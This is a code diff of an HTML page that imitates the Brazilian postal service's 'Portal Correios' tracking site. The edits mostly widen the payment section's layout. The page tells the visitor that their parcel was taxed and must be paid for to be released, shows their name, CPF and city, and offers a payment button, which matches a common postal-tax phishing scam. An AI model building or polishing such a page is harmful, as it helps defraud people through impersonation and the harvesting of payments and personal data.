@@ -223,7 +223,7 @@
       padding: 2.5rem;
       font-family: Arial, sans-serif;
       text-align: left;
-      max-width: 1000px;
+      max-width: 700px;
       margin: 2rem auto;
       display: none;
     }
@@ -540,9 +540,10 @@
   });
 </script>
 
-    <!-- Tela Pagamento -->
-<section id="pagamento">
-  <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+    <!-- Tela Pagamento - Versão com largura aumentada -->
+<section id="pagamento" style="max-width: 1200px; margin: 2rem auto;"> <!-- Aumentei para 1200px -->
+  
+  <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400" style="max-width: 1200px; margin: 0 auto;">
     <span class="text-blue mr-2">Portal Correios</span>
     <i class="fal fa-angle-right mr-2"></i>
     <span class="text-blue mr-2">Rastreamento</span>
@@ -550,7 +551,7 @@
     <span class="text-blue mr-2"><span class="cpf"></span></span>
   </nav>
 
-  <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+  <section class="mt-3 p-4" style="max-width: 1200px; margin:0 auto;">
     <h5 class="text-danger font-weight-700 mb-4">
       <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
     </h5>
@@ -565,27 +566,28 @@
     <p class="mt-4">Para prosseguir com o processo de liberação e entrega da sua encomenda, é necessário efetuar o pagamento das taxas aplicáveis. Por favor, utilize o botão abaixo para realizar o procedimento de forma segura:</p>
   </section>
   
-  <div style="padding: 0px 30px 0px 30px;">
+  <div style="padding: 0px 30px; max-width: 1200px; margin: 0 auto;">
     <button id="btn-pagar" class="btn btn-primary" style="font-size:13px;width: 100%;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</button>
   </div>
 
-  <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
-      <div class="container">
-        <div class="overlay">
-          <div class="overlay-text">
-            <p class="rotate" style="margin-top:28%; margin-right:0%;"> 
-              NOME: <span id="pag-nome"></span><br>
-              CPF: <span id="pag-cpf"></span>
-            </p>
-            <p class="rotate" style="margin-top:10%;"> 
-              RUA: <br>
-              BAIRRO: <br>
-              CIDADE: <span id="pag-cidade"></span>
-            </p>
-          </div>
+  <section class="mt-3 p-4" style="max-width: 1200px; margin:0 auto;">
+    <div class="container" style="width: 100%; max-width: 1200px;">
+      <div class="overlay" style="background-size: cover; height: 300px;">
+        <div class="overlay-text" style="width: 90%;">
+          <p class="rotate" style="margin-top:28%; margin-right:0%; font-size: 14px;"> 
+            NOME: <span id="pag-nome"></span><br>
+            CPF: <span id="pag-cpf"></span>
+          </p>
+          <p class="rotate" style="margin-top:10%; font-size: 14px;"> 
+            RUA: <br>
+            BAIRRO: <br>
+            CIDADE: <span id="pag-cidade"></span>
+          </p>
         </div>
       </div>
-    </section>
+    </div>
+  </section>
+</section>
 
   <style>
     /* Estilo para o contêiner pai */
